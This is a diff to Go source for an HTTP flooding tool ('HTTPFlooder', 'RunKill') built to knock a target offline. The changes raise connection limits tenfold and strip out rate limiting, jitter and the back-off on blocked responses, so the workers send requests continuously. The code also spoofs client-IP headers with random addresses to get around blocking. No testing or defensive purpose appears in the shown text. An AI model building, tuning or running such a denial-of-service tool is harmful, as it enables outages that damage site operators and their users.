@@ -135,9 +135,9 @@ func (h *HTTPFlooder) RunKill(target string, port int, workers int, rateLimit in
 					Timeout:   10 * time.Second,
 					KeepAlive: 300 * time.Second,
 				}).DialContext,
-				MaxIdleConns:        10000,
-				MaxConnsPerHost:     10000,
-				MaxIdleConnsPerHost: 1000,
+				MaxIdleConns:        100000,
+				MaxConnsPerHost:     100000,
+				MaxIdleConnsPerHost: 10000,
 				IdleConnTimeout:     300 * time.Second,
 				DisableKeepAlives:   false,
 				DisableCompression:  true,
@@ -157,25 +157,13 @@ func (h *HTTPFlooder) RunKill(target string, port int, workers int, rateLimit in
 		"/api/v1/users", "/api/v2/data", "/search", "/graphql",
 		"/.env", "/wp-content/plugins", "/xmlrpc.php",
 	}
-	postData := make([]byte, 1024*1024)
-	rand.Read(postData)
 
 	for w := 0; w < workers; w++ {
 		c := clients[w%len(clients)]
-		proxyURL := ""
-		if len(proxyList) > 0 {
-			proxyURL = proxyList[rand.Intn(len(proxyList))]
-		}
-		go func(client *http.Client, pxy string) {
+		go func(client *http.Client) {
 			atomic.AddInt32(&active, 1)
 			defer atomic.AddInt32(&active, -1)
-			consecBlocked := 0
 			for !h.stopped() {
-				if consecBlocked > 3 {
-					time.Sleep(3 * time.Second)
-					consecBlocked = 0
-					continue
-				}
 				isPost := rand.Intn(3) == 0
 				p := paths[rand.Intn(len(paths))]
 				url := baseURL + p
@@ -183,8 +171,7 @@ func (h *HTTPFlooder) RunKill(target string, port int, workers int, rateLimit in
 				var req *http.Request
 				var err error
 				if isPost {
-					size := 1024 * (1 + rand.Intn(10))
-					body := make([]byte, size)
+					body := make([]byte, 1024)
 					rand.Read(body)
 					req, err = http.NewRequest("POST", url, readerFromBytes(body))
 				} else {
@@ -203,36 +190,17 @@ func (h *HTTPFlooder) RunKill(target string, port int, workers int, rateLimit in
 				req.Header.Set("X-Forwarded-For", randIP())
 				req.Header.Set("X-Real-IP", randIP())
 				req.Header.Set("Forwarded", fmt.Sprintf("for=%s;proto=http;by=%s", randIP(), randIP()))
-				for i := 0; i < rand.Intn(20); i++ {
-					req.Header.Set(fmt.Sprintf("X-Rand-%d", i), randStr(64))
-				}
 
 				resp, err := client.Do(req)
 				if err != nil {
 					atomic.AddInt64(&h.errors, 1)
 				} else {
-					if resp.StatusCode == 403 || resp.StatusCode == 429 || resp.StatusCode == 503 {
-						consecBlocked++
-					} else {
-						consecBlocked = 0
-					}
-					totalRead := 0
-					buf := make([]byte, 4096)
-					for {
-						n, rerr := resp.Body.Read(buf)
-						totalRead += n
-						if rerr != nil {
-							break
-						}
-						if totalRead > 8192 {
-							break
-						}
-					}
+					io.CopyN(io.Discard, resp.Body, 8192)
 					resp.Body.Close()
 					atomic.AddInt64(&h.sent, 1)
 				}
 			}
-		}(c, proxyURL)
+		}(c)
 	}
 
 	ticker := time.NewTicker(1 * time.Second)
@@ -284,17 +252,7 @@ func (h *HTTPFlooder) workerLoop(url string, active *int32, jitter int, ratePerS
 		client = h.client
 	}
 
-	interval := time.Second / time.Duration(ratePerSec)
-	if interval < time.Microsecond {
-		interval = time.Microsecond
-	}
-	rateTicker := time.NewTicker(interval)
-	defer rateTicker.Stop()
-
-	for range rateTicker.C {
-		if h.stopped() {
-			return
-		}
+	for !h.stopped() {
 		req, err := http.NewRequest("GET", url, nil)
 		if err != nil {
 			atomic.AddInt64(&h.errors, 1)
@@ -311,18 +269,11 @@ func (h *HTTPFlooder) workerLoop(url string, active *int32, jitter int, ratePerS
 		resp, err := client.Do(req)
 		if err != nil {
 			atomic.AddInt64(&h.errors, 1)
-			if jitter > 0 {
-				time.Sleep(time.Duration(jitter) * time.Microsecond)
-			}
 			continue
 		}
-		io.Copy(io.Discard, resp.Body)
+		io.CopyN(io.Discard, resp.Body, 8192)
 		resp.Body.Close()
 		atomic.AddInt64(&h.sent, 1)
-
-		if jitter > 0 {
-			time.Sleep(time.Duration(jitter) * time.Microsecond)
-		}
 	}
 }
 
